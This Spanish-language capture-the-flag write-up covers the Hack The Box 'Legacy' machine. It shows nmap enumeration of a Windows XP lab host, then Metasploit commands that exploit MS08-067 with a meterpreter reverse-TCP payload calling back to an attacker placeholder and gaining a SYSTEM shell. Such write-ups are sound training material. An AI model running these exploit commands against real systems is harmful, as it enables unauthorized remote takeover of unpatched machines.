---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - SMB
  - MSF
  - RCE
  - MS08-067
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Identificación del sistema|Identificación del sistema]]
	- [[#Enumeración#Identificación de puertos|Identificación de puertos]]
	- [[#Enumeración#Enumeración SMB|Enumeración SMB]]
- [[#Explotación|Explotación]]
	- [[#Explotación#RCE|RCE]]

---
# Legacy

![](Screenshots/Pasted%20image%2020260424092158.png)

>Máquina retirada de Hack The Box llamada **[Legacy](https://app.hackthebox.com/machines/Legacy)**, que presenta un entorno **Windows XP** vulnerable a servicios heredados expuestos en red.  
>La explotación comienza con la **enumeración de servicios SMB**, donde se identifica que el sistema es vulnerable a la conocida vulnerabilidad **MS08-067**, que permite **ejecución remota de código (RCE)** sin autenticación.  
>Mediante el uso de un exploit público para **MS08-067**, se obtiene acceso inicial al sistema con privilegios elevados, comprometiendo directamente la máquina.  
>Una vez dentro, se confirma que el acceso se ha conseguido como **NT AUTHORITY\SYSTEM**, lo que equivale al máximo nivel de privilegios en el sistema.  
>Finalmente, al tratarse de una máquina sin segmentación adicional ni restricciones relevantes, se accede directamente a las flags, completando el compromiso total del sistema.

---
## Enumeración
### Identificación del sistema

```PowerShell
ping -c 1 10.129.227.181
PING 10.129.227.181 (10.129.227.181) 56(84) bytes of data.
64 bytes from 10.129.227.181: icmp_seq=1 ttl=127 time=51.1 ms

--- 10.129.227.181 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 51.073/51.073/51.073/0.000 ms
```

El `TTL=127` indica que probablemente estamos ante un sistema Windows.
### Identificación de puertos

```
nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.129.227.181 -oG allPorts
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127
```

Se identifican los siguientes puertos relevantes:
- `135 → MSRPC`
- `139 → NetBIOS`
- `445 → SMB`

```PowerShell
nmap -p135,139,445 -sCV 10.129.227.181 -oN targeted
ORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:06:bf (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2026-04-29T11:12:43+03:00
|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s
```

El puerto `445` abierto indica la presencia de **SMB**, un servicio común en entornos Windows. Dado que se trata de una versión antigua del sistema operativo, es un vector claro para buscar vulnerabilidades conocidas como MS08-067.
### Enumeración SMB

Se lanzan scripts de enumeración de **SMB** con `Nmap`.

```PowerShell
nmap --script "smb-*" -p 445 10.129.227.181
NSE: [smb-brute] usernames: Time limit 10m00s exceeded.
NSE: [smb-brute] usernames: Time limit 10m00s exceeded.
NSE: [smb-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for legacy (10.129.227.181)
Host is up (0.047s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.129.227.181\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.129.227.181\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.129.227.181\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-mbenum: ERROR: Script execution failed (use -d to debug)
|_smb-print-text: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
| smb-brute: 
|_  No accounts found
|_smb-flood: ERROR: Script execution failed (use -d to debug)
| smb-protocols: 
|   dialects: 
|_    NT LM 0.12 (SMBv1) [dangerous, but default]
```

Se identifican dos vulnerabilidades críticas:
- **MS08-067 (CVE-2008-4250)**
- **MS17-010 (EternalBlue)**

El script `smb-vuln-ms08-067` confirma que el sistema es vulnerable, permitiendo ejecución remota de código sin autenticación.

Aunque ambas vulnerabilidades son explotables, se opta por **MS08-067**, ya que resulta más estable y directa en este escenario.

---
## Explotación
### RCE

La vulnerabilidad **MS08-067** afecta al servicio **Server (SMB)** en sistemas Windows antiguos, permitiendo a un atacante remoto enviar paquetes especialmente diseñados que provocan un desbordamiento de buffer, logrando ejecución de código sin autenticación.

Esto permite lograr **ejecución remota de código sin autenticación**.

```PowerShell
msfconsole
search CVE-2008-4250
use 0 | use exploit/windows/smb/ms08_067_netapi
show options
Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     [ATTACKER_IP]    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
   
set RHOSTS 10.129.227.181
set LHOST [ATTACKER_IP]
exploit
```

Se obtiene una consola interactiva:

```PowerShell
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

El exploit proporciona una shell directamente como **NT AUTHORITY\SYSTEM**, ya que el servicio vulnerable se ejecuta con privilegios elevados.

La flag de `usuario` se encuentra en: `C:\Documents and Settings\john\Desktop`.

La flag de `root` se encuentra en `C:\Documents and Settings\Administrator\Desktop`.

---